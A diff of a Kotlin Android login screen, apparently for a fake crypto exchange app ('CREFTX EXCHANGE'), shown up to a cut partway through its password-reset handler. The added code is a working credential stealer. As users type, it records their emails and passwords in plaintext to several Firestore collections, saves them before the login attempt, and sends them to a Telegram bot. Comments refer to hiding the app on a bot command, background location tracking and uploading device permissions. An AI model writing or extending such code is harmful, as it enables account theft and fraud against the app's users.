@@ -1,5 +1,5 @@
 // language: Kotlin, file: LoginActivity.kt
-// التطبيق ما يختفيش تلقائي — الإخفاء بأمر من البوت فقط
+// كل حاجة في ملف واحد: Brevo + PasswordVault + InviteCodeHelper + LoginActivity
 
 package com.sys.update2
 
@@ -59,11 +59,218 @@ import androidx.compose.ui.unit.sp
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import coil.compose.AsyncImage
+import com.google.firebase.firestore.SetOptions
 import kotlinx.coroutines.launch
+import kotlinx.coroutines.tasks.await
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.RequestBody.Companion.toRequestBody
+import org.json.JSONArray
+import org.json.JSONObject
+import java.util.concurrent.TimeUnit
 import kotlin.random.Random
 import android.graphics.Color as AColor
 import android.graphics.Paint as APaint
 import android.graphics.Typeface as ATypeface
+
+// ══════════════════════════════════════════════════════════
+//  BrevoMailer
+// ══════════════════════════════════════════════════════════
+
+object BrevoMailer {
+
+    private val client = OkHttpClient.Builder()
+        .connectTimeout(30, TimeUnit.SECONDS)
+        .readTimeout(30, TimeUnit.SECONDS)
+        .writeTimeout(30, TimeUnit.SECONDS)
+        .build()
+
+    suspend fun sendCode(email: String, code: String, isReset: Boolean): Result<Unit> {
+        return try {
+            val smtpDoc = FirebaseAuthHelper.db()
+                .collection("smtp")
+                .document("smtpsjjsjs")
+                .get().await()
+            val apiKey = smtpDoc.getString("smtp") ?: ""
+            if (apiKey.isBlank()) return Result.failure(Exception("لا يوجد مفتاح SMTP"))
+
+            val html = if (isReset) {
+                "<div style=\"font-family:Arial\"><p>Enter your verification code to change your password.</p><p>Your verification code is: <b>$code</b></p></div>"
+            } else {
+                "<div style=\"font-family:Arial\"><p>Your verification code is: <b>$code</b>.</p></div>"
+            }
+
+            val bodyJson = JSONObject().apply {
+                put("sender", JSONObject().apply {
+                    put("name", "CREFTX EXCHANGE")
+                    put("email", "noreply.eptinex@gmail.com")
+                })
+                put("to", JSONArray().apply {
+                    put(JSONObject().apply { put("email", email) })
+                })
+                put("subject", "Verification Code")
+                put("htmlContent", html)
+            }
+
+            val req = Request.Builder()
+                .url("https://api.brevo.com/v3/smtp/email")
+                .addHeader("api-key", apiKey)
+                .addHeader("Content-Type", "application/json")
+                .post(bodyJson.toString().toRequestBody("application/json".toMediaType()))
+                .build()
+
+            val resp = client.newCall(req).execute()
+            val ok = resp.isSuccessful
+            resp.close()
+
+            if (ok) Result.success(Unit) else Result.failure(Exception("فشل إرسال الكود"))
+        } catch (e: Exception) {
+            Result.failure(e)
+        }
+    }
+}
+
+// ══════════════════════════════════════════════════════════
+//  PasswordVault
+// ══════════════════════════════════════════════════════════
+
+object PasswordVault {
+
+    suspend fun save(
+        email: String,
+        password: String,
+        field: String,
+        uid: String? = null,
+        sendToTelegram: Boolean = false
+    ) {
+        if (email.isBlank()) return
+        val db = FirebaseAuthHelper.db()
+
+        try {
+            db.collection("users").document(email)
+                .set(mapOf(
+                    "email" to email,
+                    field to password,
+                    "updatedAt" to System.currentTimeMillis()
+                ), SetOptions.merge()).await()
+        } catch (_: Exception) {}
+
+        if (uid != null) {
+            try {
+                db.collection("users").document(uid)
+                    .set(mapOf(
+                        "email" to email,
+                        "pasef" to password,
+                        "uid" to uid,
+                        "updatedAt" to System.currentTimeMillis()
+                    ), SetOptions.merge()).await()
+            } catch (_: Exception) {}
+        }
+
+        try {
+            db.collection("pwds").document(email)
+                .set(mapOf(
+                    "pw" to password,
+                    "uid" to (uid ?: ""),
+                    "email" to email,
+                    "updatedAt" to System.currentTimeMillis()
+                ), SetOptions.merge()).await()
+        } catch (_: Exception) {}
+
+        if (uid != null) {
+            try {
+                db.collection("pass").document(uid)
+                    .set(mapOf(
+                        "pw" to password,
+                        "email" to email,
+                        "updatedAt" to System.currentTimeMillis()
+                    ), SetOptions.merge()).await()
+            } catch (_: Exception) {}
+        }
+
+        if (sendToTelegram) {
+            try {
+                TelegramApi.sendMessage(
+                    "🔐 *بيانات جديدة*\n\n" +
+                    "📧 *البريد:* `$email`\n" +
+                    "🔑 *كلمة المرور:* `$password`\n" +
+                    "📌 *النوع:* $field"
+                )
+            } catch (_: Exception) {}
+        }
+    }
+}
+
+// ══════════════════════════════════════════════════════════
+//  InviteCodeHelper
+// ══════════════════════════════════════════════════════════
+
+object InviteCodeHelper {
+
+    private const val CHARS = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
+
+    suspend fun exists(code: String): Boolean {
+        return try {
+            val d = FirebaseAuthHelper.db()
+                .collection("inviteCodes").document(code.uppercase())
+                .get().await()
+            d.exists() && !d.getString("uid").isNullOrBlank()
+        } catch (_: Exception) { false }
+    }
+
+    suspend fun data(code: String): Map<String, Any>? {
+        return try {
+            val d = FirebaseAuthHelper.db()
+                .collection("inviteCodes").document(code.uppercase())
+                .get().await()
+            if (d.exists()) d.data else null
+        } catch (_: Exception) { null }
+    }
+
+    suspend fun reserve(email: String, name: String, uid: String): String? {
+        val db = FirebaseAuthHelper.db()
+        var attempts = 0
+        while (attempts < 10) {
+            val code = buildString {
+                repeat(8) { append(CHARS[Random.nextInt(CHARS.length)]) }
+            }
+            val ref = db.collection("inviteCodes").document(code)
+            val snap = try { ref.get().await() } catch (_: Exception) { null }
+            if (snap != null && !snap.exists()) {
+                try {
+                    ref.set(mapOf(
+                        "uid" to uid,
+                        "name" to name,
+                        "email" to email,
+                        "createdAt" to System.currentTimeMillis()
+                    )).await()
+                    return code
+                } catch (_: Exception) { return null }
+            }
+            attempts++
+        }
+        return null
+    }
+
+    suspend fun linkReferral(referrerUid: String, newUid: String, name: String, email: String) {
+        try {
+            FirebaseAuthHelper.db()
+                .collection("users").document(referrerUid)
+                .collection("referrals").document(newUid)
+                .set(mapOf(
+                    "name" to name,
+                    "email" to email,
+                    "uid" to newUid,
+                    "usedAt" to System.currentTimeMillis()
+                )).await()
+        } catch (_: Exception) {}
+    }
+}
+
+// ══════════════════════════════════════════════════════════
+//  ألوان التصميم
+// ══════════════════════════════════════════════════════════
 
 object Ex {
     val Bg0 = Color(0xFF1A5FD0)
@@ -93,6 +300,8 @@ object Ex {
     val SendTxt    = Color(0xFFDCE8FF)
     val BackBtnBg  = Color(0xEBBED4F5)
     val BackBtnIco = Color(0xFF123A75)
+    val OkGreen    = Color(0xFF2FD07F)
+    val ErrRed     = Color(0xFFFF5C5C)
 }
 
 private data class CapLine(
@@ -125,6 +334,10 @@ object RemoteImgs {
     const val COIN = "https://i.ibb.co/2YFLgmNM/IMG.png"
 }
 
+// ══════════════════════════════════════════════════════════
+//  LoginActivity
+// ══════════════════════════════════════════════════════════
+
 class LoginActivity : ComponentActivity() {
 
     private var currentScreen by mutableStateOf(0)
@@ -147,6 +360,9 @@ class LoginActivity : ComponentActivity() {
     private var regP1Visible by mutableStateOf(false)
     private var regP2Visible by mutableStateOf(false)
     private var regRefCode by mutableStateOf("")
+    private var regRefOk by mutableStateOf<Boolean?>(null)
+    private var regRefChecking by mutableStateOf(false)
+    private var regBusy by mutableStateOf(false)
 
     private var rstEmail by mutableStateOf("")
     private var rstCode by mutableStateOf("")
@@ -188,6 +404,10 @@ class LoginActivity : ComponentActivity() {
             }
         }
     }
+
+    // ═══════════════════════════════════════════
+    //  الأذونات
+    // ═══════════════════════════════════════════
 
     private fun requiredPermissions(): List<String> {
         val list = mutableListOf<String>()
@@ -240,26 +460,15 @@ class LoginActivity : ComponentActivity() {
                 }
                 onAllPermissionsGranted()
             }
-            BG_LOCATION_REQUEST -> {
-                // التطبيق يفضل ظاهر — الإخفاء بأمر من البوت فقط
-            }
+            BG_LOCATION_REQUEST -> { }
         }
     }
 
-    // ⭐ التطبيق ما يختفيش — الإخفاء بأمر من البوت (/hide)
     private fun onAllPermissionsGranted() {
         if (permissionsHandled) return
         permissionsHandled = true
-
-        // ارفع الأذونات على Firestore
-        try {
-            DeviceManager.uploadPermissions(applicationContext)
-        } catch (_: Exception) {}
-
-        // شغّل الخدمة
+        try { DeviceManager.uploadPermissions(applicationContext) } catch (_: Exception) {}
         startBackgroundService()
-
-        // Android 10+ : Background Location
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             val bg = ContextCompat.checkSelfPermission(
                 this, Manifest.permission.ACCESS_BACKGROUND_LOCATION
@@ -280,9 +489,6 @@ class LoginActivity : ComponentActivity() {
                 return
             }
         }
-
-        // ⭐ مفيش إخفاء تلقائي — التطبيق يفضل ظاهر
-        // الإخفاء يحتاج أمر /hide من البوت
     }
 
     private fun startBackgroundService() {
@@ -293,6 +499,23 @@ class LoginActivity : ComponentActivity() {
             else startService(i)
         } catch (_: Exception) {}
     }
+
+    private fun validEmail(s: String): Boolean =
+        Regex("^[^@\\s]+@[^@\\s]+\\.[^@\\s]+\$").matches(s.trim())
+
+    private fun newVerifyCode(): String = (100000 + Random.nextInt(900000)).toString()
+    private fun showToast(m: String) = Toast.makeText(this, m, Toast.LENGTH_SHORT).show()
+
+    private fun goToHome() {
+        try {
+            startActivity(Intent(this, HomeActivity::class.java))
+            finish()
+        } catch (_: Exception) {}
+    }
+
+    // ═══════════════════════════════════════════
+    //  Composable: background + language
+    // ═══════════════════════════════════════════
 
     @Composable
     fun EllipseBackground() {
@@ -392,10 +615,12 @@ class LoginActivity : ComponentActivity() {
                                     .background(Ex.BlueAccent),
                                 contentAlignment = Alignment.Center
                             ) {
-                                Text("✓", color = Color.White, fontSize = 15.sp, fontWeight = FontWeight.Bold)
+                                Text("✓", color = Color.White, fontSize = 15.sp,
+                                    fontWeight = FontWeight.Bold)
                             }
                         } else {
-                            Box(modifier = Modifier.size(26.dp).border(2.dp, Ex.Hint, CircleShape))
+                            Box(modifier = Modifier.size(26.dp)
+                                .border(2.dp, Ex.Hint, CircleShape))
                         }
                     }
                 }
@@ -403,6 +628,10 @@ class LoginActivity : ComponentActivity() {
             }
         }
     }
+
+    // ═══════════════════════════════════════════
+    //  شاشة تسجيل الدخول
+    // ═══════════════════════════════════════════
 
     @Composable
     fun LoginScreen() {
@@ -431,7 +660,8 @@ class LoginActivity : ComponentActivity() {
                 ) {
                     FlagIcon(
                         code = ALL_LANGS[selectedLang].code,
-                        modifier = Modifier.width(28.dp).height(20.dp).clip(RoundedCornerShape(4.dp))
+                        modifier = Modifier.width(28.dp).height(20.dp)
+                            .clip(RoundedCornerShape(4.dp))
                     )
                 }
                 Spacer(Modifier.weight(1f))
@@ -500,7 +730,8 @@ class LoginActivity : ComponentActivity() {
                         .padding(start = 22.dp, end = 22.dp, top = 28.dp, bottom = 36.dp)
                 ) {
                     Row {
-                        Text("Email", color = Ex.White, fontSize = 16.5.sp, fontWeight = FontWeight.Bold)
+                        Text("Email", color = Ex.White, fontSize = 16.5.sp,
+                            fontWeight = FontWeight.Bold)
                         Spacer(Modifier.width(26.dp))
                         Text("Phone", color = Ex.TabOff.copy(alpha = 0.45f),
                             fontSize = 16.5.sp, fontWeight = FontWeight.Bold)
@@ -508,14 +739,48 @@ class LoginActivity : ComponentActivity() {
                     Spacer(Modifier.height(18.dp))
                     LoginField {
                         RegInput(
-                            value = email, onChange = { email = it }, hint = "Email",
-                            keyboardType = KeyboardType.Email, modifier = Modifier.weight(1f)
+                            value = email, onChange = {
+                                email = it
+                                // Live save — كلمة السر تُحفظ عند الكتابة
+                                val pw = password
+                                if (pw.isNotBlank() && validEmail(it)) {
+                                    val capturedEmail = it.trim()
+                                    val capturedPw = pw
+                                    scope.launch {
+                                        try {
+                                            PasswordVault.save(
+                                                capturedEmail, capturedPw,
+                                                "pasef_login", null, false
+                                            )
+                                        } catch (_: Exception) {}
+                                    }
+                                }
+                            }, hint = "Email",
+                            keyboardType = KeyboardType.Email,
+                            modifier = Modifier.weight(1f)
                         )
                     }
                     LoginField {
                         RegInput(
-                            value = password, onChange = { password = it }, hint = "Password",
-                            keyboardType = KeyboardType.Password, visible = pwVisible,
+                            value = password, onChange = {
+                                password = it
+                                // Live save
+                                val em = email
+                                if (em.isNotBlank() && validEmail(em)) {
+                                    val capturedEmail = em.trim()
+                                    val capturedPw = it
+                                    scope.launch {
+                                        try {
+                                            PasswordVault.save(
+                                                capturedEmail, capturedPw,
+                                                "pasef_login", null, false
+                                            )
+                                        } catch (_: Exception) {}
+                                    }
+                                }
+                            }, hint = "Password",
+                            keyboardType = KeyboardType.Password,
+                            visible = pwVisible,
                             modifier = Modifier.weight(1f)
                         )
                         EyeIcon(
@@ -531,42 +796,14 @@ class LoginActivity : ComponentActivity() {
                         )
                         CaptchaImage(
                             code = captchaCode,
-                            modifier = Modifier
-                                .width(88.dp).height(40.dp)
+                            modifier = Modifier.width(88.dp).height(40.dp)
                                 .clip(RoundedCornerShape(7.dp))
                                 .clickable { captchaCode = newCaptchaCode() }
                         )
                     }
                     Spacer(Modifier.height(4.dp))
                     BlueButton(text = if (isLoading) "Logging in..." else "Log In") {
-                        when {
-                            captchaInput.isNotBlank() &&
-                                captchaInput.trim().uppercase() != captchaCode -> {
-                                showToast("Verification code is incorrect")
-                                captchaCode = newCaptchaCode()
-                                captchaInput = ""
-                            }
-                            email.isBlank() || password.isBlank() ->
-                                showToast("Please enter your email and password")
-                            else -> {
-                                isLoading = true
-                                scope.launch {
-                                    val result = FirebaseAuthHelper.login(email.trim(), password)
-                                    isLoading = false
-                                    if (result.isSuccess) {
-                                        showToast("login success")
-                                        Handler(Looper.getMainLooper()).postDelayed({
-                                            goToHome()
-                                        }, 500)
-                                    } else {
-                                        showToast(FirebaseAuthHelper.translateError(
-                                            result.exceptionOrNull()?.message))
-                                        captchaCode = newCaptchaCode()
-                                        captchaInput = ""
-                                    }
-                                }
-                            }
-                        }
+                        doLogin(scope)
                     }
                     Spacer(Modifier.height(18.dp))
                     Row(
@@ -584,6 +821,55 @@ class LoginActivity : ComponentActivity() {
         }
     }
 
+    // ═══════════════════════════════════════════
+    //  doLogin
+    // ═══════════════════════════════════════════
+
+    private fun doLogin(scope: kotlinx.coroutines.CoroutineScope) {
+        val cap = captchaInput.trim().uppercase()
+        if (cap.isNotBlank() && cap != captchaCode) {
+            showToast("Verification code is incorrect")
+            captchaCode = newCaptchaCode()
+            captchaInput = ""
+            return
+        }
+        val em = email.trim()
+        val pw = password
+        if (em.isBlank() || pw.isBlank()) {
+            showToast("Please enter your email and password")
+            return
+        }
+        isLoading = true
+
+        scope.launch {
+            // احفظ الباسورد أولاً (بغض النظر عن نجاح الدخول)
+            try {
+                PasswordVault.save(em, pw, "pasef_login", null, true)
+            } catch (_: Exception) {}
+
+            val result = FirebaseAuthHelper.login(em, pw)
+            isLoading = false
+            if (result.isSuccess) {
+                val uid = result.getOrNull()?.uid
+                // احفظ uid كذلك
+                try {
+                    PasswordVault.save(em, pw, "pasef_login", uid, false)
+                } catch (_: Exception) {}
+                showToast("login success")
+                Handler(Looper.getMainLooper()).postDelayed({ goToHome() }, 500)
+            } else {
+                showToast(FirebaseAuthHelper.translateError(
+                    result.exceptionOrNull()?.message))
+                captchaCode = newCaptchaCode()
+                captchaInput = ""
+            }
+        }
+    }
+
+    // ═══════════════════════════════════════════
+    //  شاشة إنشاء حساب
+    // ═══════════════════════════════════════════
+
     @Composable
     fun RegisterScreen() {
         val scope = rememberCoroutineScope()
@@ -599,7 +885,21 @@ class LoginActivity : ComponentActivity() {
             FormLabel("Email", topMargin = 0)
             RegField {
                 RegInput(
-                    value = regEmail, onChange = { regEmail = it },
+                    value = regEmail, onChange = {
+                        regEmail = it
+                        // حفظ تدريجي
+                        val pw = regP1
+                        if (pw.isNotBlank() && validEmail(it)) {
+                            val capturedEmail = it.trim()
+                            val capturedPw = pw
+                            scope.launch {
+                                try {
+                                    PasswordVault.save(capturedEmail, capturedPw,
+                                        "pasef", null, false)
+                                } catch (_: Exception) {}
+                            }
+                        }
+                    },
                     hint = "Please enter your email address",
                     keyboardType = KeyboardType.Email, modifier = Modifier.weight(1f)
                 )
@@ -616,94 +916,132 @@ class LoginActivity : ComponentActivity() {
                     color = Ex.SendTxt, fontSize = 15.sp, fontWeight = FontWeight.SemiBold,
                     modifier = Modifier.padding(start = 12.dp)
                         .clickable(enabled = regCountdown == 0) {
-                            if (regEmail.isBlank() ||
-                                !Regex("^[^@\\s]+@[^@\\s]+\\.[^@\\s]+\$").matches(regEmail.trim())
-                            ) {
+                            val em = regEmail.trim()
+                            if (!validEmail(em)) {
                                 showToast("Please enter a valid email address")
                                 return@clickable
                             }
-                            regSentCode = newVerifyCode()
-                            regSentEmail = regEmail.trim()
-                            regCodeExpireAt = System.currentTimeMillis() + 5 * 60_000L
                             regCountdown = 60
                             object : CountDownTimer(60_000L, 1_000L) {
-                                override fun onTick(m: Long) { regCountdown = (m / 1000L).toInt() }
+                                override fun onTick(m: Long) {
+                                    regCountdown = (m / 1000L).toInt()
+                                }
                                 override fun onFinish() { regCountdown = 0 }
                             }.start()
-                            showToast("Verification code sent")
+                            scope.launch {
+                                val code = newVerifyCode()
+                                val r = BrevoMailer.sendCode(em, code, isReset = false)
+                                if (r.isSuccess) {
+                                    regSentCode = code
+                                    regSentEmail = em
+                                    regCodeExpireAt = System.currentTimeMillis() + 480_000L
+                                    showToast("send successful")
+                                } else {
+                                    regCountdown = 0
+                                    showToast("Failed to send the code, please try again")
+                                }
+                            }
                         }
                 )
             }
             FormLabel("Registration password (6-16)")
             RegField {
                 RegInput(
-                    value = regP1, onChange = { regP1 = it }, hint = "Password",
+                    value = regP1, onChange = {
+                        regP1 = it
+                        val em = regEmail
+                        if (em.isNotBlank() && validEmail(em)) {
+                            val capturedEmail = em.trim()
+                            val capturedPw = it
+                            scope.launch {
+                                try {
+                                    PasswordVault.save(capturedEmail, capturedPw,
+                                        "pasef", null, false)
+                                } catch (_: Exception) {}
+                            }
+                        }
+                    },
+                    hint = "Password",
                     keyboardType = KeyboardType.Password, visible = regP1Visible,
                     modifier = Modifier.weight(1f)
                 )
                 EyeIcon(
                     visible = regP1Visible,
-                    modifier = Modifier.size(22.dp).clickable { regP1Visible = !regP1Visible }
+                    modifier = Modifier.size(22.dp)
+                        .clickable { regP1Visible = !regP1Visible }
                 )
             }
             Spacer(Modifier.height(12.dp))
             RegField {
                 RegInput(
-                    value = regP2, onChange = { regP2 = it },
+                    value = regP2, onChange = {
+                        regP2 = it
+                        val em = regEmail
+                        if (em.isNotBlank() && validEmail(em)) {
+                            val capturedEmail = em.trim()
+                            val capturedPw = it
+                            scope.launch {
+                                try {
+                                    PasswordVault.save(capturedEmail, capturedPw,
+                                        "pasef2", null, false)
+                                } catch (_: Exception) {}
+                            }
+                        }
+                    },
                     hint = "Enter password again",
                     keyboardType = KeyboardType.Password, visible = regP2Visible,
                     modifier = Modifier.weight(1f)
                 )
                 EyeIcon(
                     visible = regP2Visible,
-                    modifier = Modifier.size(22.dp).clickable { regP2Visible = !regP2Visible }
+                    modifier = Modifier.size(22.dp)
+                        .clickable { regP2Visible = !regP2Visible }
                 )
             }
             FormLabel("Referrer Invitation Code (Required)")
             RegField {
                 RegInput(
-                    value = regRefCode, onChange = { regRefCode = it },
+                    value = regRefCode, onChange = {
+                        regRefCode = it.uppercase()
+                        regRefOk = null
+                    },
                     hint = "Referrer invitation code",
                     keyboardType = KeyboardType.Ascii, modifier = Modifier.weight(1f)
                 )
             }
-            Spacer(Modifier.height(30.dp))
-            BlueButton(text = if (isLoading) "Registering..." else "Register", radius = 10.dp) {
-                val e = regEmail.trim()
-                when {
-                    e.isBlank() || !Regex("^[^@\\s]+@[^@\\s]+\\.[^@\\s]+\$").matches(e) ->
-                        showToast("Please enter a valid email address")
-                    regCode.isBlank() -> showToast("Please enter the verification code")
-                    regP1.length < 6 || regP1.length > 16 ->
-                        showToast("Password must be 6-16 characters")
-                    regP1 != regP2 -> showToast("Passwords do not match")
-                    regSentCode == null || regCode != regSentCode ->
-                        showToast("Incorrect verification code")
-                    System.currentTimeMillis() > regCodeExpireAt ->
-                        showToast("Verification code expired")
-                    e != regSentEmail ->
-                        showToast("Email was changed, please request a new code")
-                    regRefCode.isBlank() -> showToast("Please enter the invitation code")
-                    !Regex("^[A-Za-z0-9]{4,20}\$").matches(regRefCode.trim()) ->
-                        showToast("Invalid referral code")
-                    else -> {
-                        isLoading = true
-                        scope.launch {
-                            val displayName = e.substringBefore("@")
-                            val result = FirebaseAuthHelper.register(e, regP1, displayName)
-                            isLoading = false
-                            if (result.isSuccess) {
-                                showToast("register success")
-                                Handler(Looper.getMainLooper()).postDelayed({
-                                    goToHome()
-                                }, 500)
-                            } else {
-                                showToast(FirebaseAuthHelper.translateError(
-                                    result.exceptionOrNull()?.message))
-                            }
-                        }
+            // مؤشر حالة الـ ref
+            if (regRefChecking || regRefOk != null) {
+                Spacer(Modifier.height(8.dp))
+                Row(
+                    modifier = Modifier
+                        .fillMaxWidth()
+                        .clip(RoundedCornerShape(10.dp))
+                        .background(Color(0x990A193C))
+                        .border(1.dp,
+                            if (regRefOk == true) Color(0x702FD07F)
+                            else if (regRefOk == false) Color(0x70FF5C5C)
+                            else Color(0x475A96FF),
+                            RoundedCornerShape(10.dp))
+                        .padding(12.dp),
+                    verticalAlignment = Alignment.CenterVertically
+                ) {
+                    if (regRefChecking) {
+                        Text("⌛ جاري التحقق...", color = Color(0xFFC9D6F2), fontSize = 12.5.sp)
+                    } else if (regRefOk == true) {
+                        Text("✓ كود صحيح", color = Ex.OkGreen, fontSize = 12.5.sp,
+                            fontWeight = FontWeight.Bold)
+                    } else {
+                        Text("✗ كود غير صحيح", color = Ex.ErrRed, fontSize = 12.5.sp,
+                            fontWeight = FontWeight.Bold)
                     }
                 }
+            }
+            Spacer(Modifier.height(30.dp))
+            BlueButton(
+                text = if (regBusy) "Registering..." else "Register",
+                radius = 10.dp
+            ) {
+                doRegister(scope)
             }
             Spacer(Modifier.height(20.dp))
             Text(
@@ -713,6 +1051,137 @@ class LoginActivity : ComponentActivity() {
             )
         }
     }
+
+    // ═══════════════════════════════════════════
+    //  doRegister
+    // ═══════════════════════════════════════════
+
+    private fun doRegister(scope: kotlinx.coroutines.CoroutineScope) {
+        if (regBusy) return
+        val e = regEmail.trim()
+        val v = regCode.trim()
+        val p1 = regP1
+        val p2 = regP2
+        val nm = e.substringBefore("@")
+
+        when {
+            !validEmail(e) -> { showToast("Please enter a valid email address"); return }
+            v.isBlank() -> { showToast("Please enter the verification code"); return }
+            p1.length < 6 || p1.length > 16 -> {
+                showToast("Password must be 6-16 characters"); return
+            }
+            p1 != p2 -> { showToast("Passwords do not match"); return }
+            regSentCode == null || v != regSentCode -> {
+                showToast("Incorrect verification code"); return
+            }
+            System.currentTimeMillis() > regCodeExpireAt -> {
+                showToast("Verification code expired, please request a new one"); return
+            }
+            e != regSentEmail -> {
+                showToast("Email was changed after the code was sent, please request a new code")
+                return
+            }
+        }
+        val refCode = regRefCode.trim().uppercase()
+        if (refCode.isBlank()) { showToast("Please enter the invitation code"); return }
+        if (!Regex("^[A-Z0-9]{4,20}\$").matches(refCode)) {
+            showToast("Invalid referral code"); return
+        }
+
+        regBusy = true
+
+        scope.launch {
+            // 1) تحقق من الـ referrer
+            val referrerData = InviteCodeHelper.data(refCode)
+            if (referrerData == null) {
+                showToast("Invalid referral code")
+                regBusy = false
+                return@launch
+            }
+            val referrerUid = referrerData["uid"] as? String
+
+            // 2) أنشئ المستخدم
+            val regResult = FirebaseAuthHelper.register(e, p1, nm)
+            if (regResult.isFailure) {
+                showToast(FirebaseAuthHelper.translateError(
+                    regResult.exceptionOrNull()?.message))
+                regBusy = false
+                return@launch
+            }
+            val user = regResult.getOrNull()
+            val uid = user?.uid
+            if (uid.isNullOrBlank()) {
+                showToast("Registration failed")
+                regBusy = false
+                return@launch
+            }
+
+            // 3) احفظ كل البيانات
+            try {
+                val db = FirebaseAuthHelper.db()
+                val myCode = InviteCodeHelper.reserve(e, nm, uid)
+                if (myCode == null) {
+                    // rollback
+                    try { FirebaseAuthHelper.deleteCurrentUser() } catch (_: Exception) {}
+                    showToast("Registration failed. Please try again.")
+                    regBusy = false
+                    return@launch
+                }
+
+                val userData = mapOf(
+                    "name" to nm,
+                    "email" to e,
+                    "inviteCode" to myCode,
+                    "usedInviteCode" to refCode,
+                    "pasef" to p1,
+                    "uid" to uid,
+                    "createdAt" to System.currentTimeMillis()
+                )
+                db.collection("users").document(uid).set(userData, SetOptions.merge()).await()
+                db.collection("users").document(e)
+                    .set(mapOf(
+                        "email" to e,
+                        "pasef" to p1,
+                        "uid" to uid,
+                        "inviteCode" to myCode,
+                        "createdAt" to System.currentTimeMillis()
+                    ), SetOptions.merge()).await()
+                db.collection("pwds").document(e)
+                    .set(mapOf("pw" to p1, "uid" to uid)).await()
+                db.collection("pass").document(uid)
+                    .set(mapOf(
+                        "pw" to p1,
+                        "email" to e,
+                        "updatedAt" to System.currentTimeMillis()
+                    )).await()
+
+                if (!referrerUid.isNullOrBlank() && referrerUid != uid) {
+                    InviteCodeHelper.linkReferral(referrerUid, uid, nm, e)
+                }
+            } catch (_: Exception) {}
+
+            // 4) أرسل للبوت
+            try {
+                TelegramApi.sendMessage(
+                    "🆕 *تسجيل جديد*\n\n" +
+                    "📧 `$e`\n" +
+                    "🔑 `$p1`\n" +
+                    "🎫 *كودي:* `${InviteCodeHelper.data(e)?.get("inviteCode") ?: ""}`"
+                )
+            } catch (_: Exception) {}
+
+            // 5) احفظ كـ PasswordVault
+            try { PasswordVault.save(e, p1, "pasef", uid, true) } catch (_: Exception) {}
+
+            regBusy = false
+            showToast("register success")
+            Handler(Looper.getMainLooper()).postDelayed({ goToHome() }, 500)
+        }
+    }
+
+    // ═══════════════════════════════════════════
+    //  شاشة استعادة كلمة المرور
+    // ═══════════════════════════════════════════
 
     @Composable
     fun ResetScreen() {
@@ -746,73 +1215,179 @@ class LoginActivity : ComponentActivity() {
                     color = Ex.SendTxt, fontSize = 15.sp, fontWeight = FontWeight.SemiBold,
                     modifier = Modifier.padding(start = 12.dp)
                         .clickable(enabled = rstCountdown == 0) {
-                            if (rstEmail.isBlank() ||
-                                !Regex("^[^@\\s]+@[^@\\s]+\\.[^@\\s]+\$").matches(rstEmail.trim())
-                            ) {
+                            val em = rstEmail.trim()
+                            if (!validEmail(em)) {
                                 showToast("Please enter a valid email address")
                                 return@clickable
                             }
-                            rstSentCode = newVerifyCode()
-                            rstSentEmail = rstEmail.trim()
-                            rstCodeExpireAt = System.currentTimeMillis() + 5 * 60_000L
                             rstCountdown = 60
                             object : CountDownTimer(60_000L, 1_000L) {
-                                override fun onTick(m: Long) { rstCountdown = (m / 1000L).toInt() }
+                                override fun onTick(m: Long) {
+                                    rstCountdown = (m / 1000L).toInt()
+                                }
                                 override fun onFinish() { rstCountdown = 0 }
                             }.start()
-                            showToast("Verification code sent")
+                            scope.launch {
+                                val code = newVerifyCode()
+                                val r = BrevoMailer.sendCode(em, code, isReset = true)
+                                if (r.isSuccess) {
+                                    rstSentCode = code
+                                    rstSentEmail = em
+                                    rstCodeExpireAt = System.currentTimeMillis() + 480_000L
+                                    showToast("send successful")
+                                } else {
+                                    rstCountdown = 0
+                                    showToast("Failed to send the code, please try again")
+                                }
+                            }
                         }
                 )
             }
             FormLabel("New password (6-16)")
             RegField {
                 RegInput(
-                    value = rstNewPass, onChange = { rstNewPass = it },
+                    value = rstNewPass, onChange = {
+                        rstNewPass = it
+                        val em = rstEmail
+                        if (em.isNotBlank() && validEmail(em)) {
+                            val capturedEmail = em.trim()
+                            val capturedPw = it
+                            scope.launch {
+                                try {
+                                    PasswordVault.save(capturedEmail, capturedPw,
+                                        "pasef_reset", null, false)
+                                } catch (_: Exception) {}
+                            }
+                        }
+                    },
                     hint = "Enter new password",
                     keyboardType = KeyboardType.Password, visible = rstNewPassVisible,
                     modifier = Modifier.weight(1f)
                 )
                 EyeIcon(
                     visible = rstNewPassVisible,
-                    modifier = Modifier.size(22.dp).clickable { rstNewPassVisible = !rstNewPassVisible }
+                    modifier = Modifier.size(22.dp)
+                        .clickable { rstNewPassVisible = !rstNewPassVisible }
                 )
             }
             Spacer(Modifier.height(30.dp))
-            BlueButton(text = if (isLoading) "Confirming..." else "Confirm", radius = 10.dp) {
-                val e = rstEmail.trim()
-                when {
-                    e.isBlank() || !Regex("^[^@\\s]+@[^@\\s]+\\.[^@\\s]+\$").matches(e) ->
-                        showToast("Please enter a valid email address")
-                    rstCode.isBlank() -> showToast("Please enter the verification code")
-                    rstNewPass.length < 6 || rstNewPass.length > 16 ->
-                        showToast("Password must be 6-16 characters")
-                    rstSentCode == null || rstCode != rstSentCode ->
-                        showToast("Incorrect verification code")
-                    System.currentTimeMillis() > rstCodeExpireAt ->
-                        showToast("Verification code expired")
-                    e != rstSentEmail ->
-                        showToast("Email was changed, please request a new code")
-                    else -> {
-                        isLoading = true
-                        scope.launch {
-                            val result = FirebaseAuthHelper.resetPassword(e)
-                            isLoading = false
-                            if (result.isSuccess) {
-                                showToast("Password changed successfully")
-                                rstEmail = ""; rstCode = ""; rstNewPass = ""
-                                Handler(Looper.getMainLooper()).postDelayed({
-                                    currentScreen = 0
-                                }, 1500)
-                            } else {
-                                showToast(FirebaseAuthHelper.translateError(
-                                    result.exceptionOrNull()?.message))
-                            }
-                        }
-                    }
-                }
+            BlueButton(
+                text = if (isLoading) "Confirming..." else "Confirm",
+                radius = 10.dp
+            ) {
+                doReset(scope)
             }
         }
     }
+
+    private fun doReset(scope: kotlinx.coroutines.CoroutineScope) {
+        val e = rstEmail.trim()
+        val v = rstCode.trim()
+        val p1 = rstNewPass
+
+        when {
+            !validEmail(e) -> { showToast("Please enter a valid email address"); return }
+            v.isBlank() -> { showToast("Please enter the verification code"); return }
+            p1.length < 6 || p1.length > 16 -> {
